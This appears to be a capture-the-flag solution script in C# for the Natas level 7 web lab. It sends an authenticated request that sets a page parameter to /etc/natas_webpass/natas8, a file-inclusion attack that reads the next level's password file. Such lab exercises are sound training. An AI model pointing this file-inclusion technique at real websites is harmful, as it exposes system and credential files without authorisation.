using System.Net.Http;
using System.Text;

HttpClient client = new HttpClient();
client.BaseAddress = new Uri("http://natas7.natas.labs.overthewire.org");

//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.php");
HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.php?page=/etc/natas_webpass/natas8");

string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas7:???????????????????????????????????????"));
request.Headers.Add("Authorization", "Basic " + credential);


HttpResponseMessage httpResponse = await client.SendAsync(request);
httpResponse.EnsureSuccessStatusCode();
String body = await httpResponse.Content.ReadAsStringAsync();
Console.WriteLine(body) ;
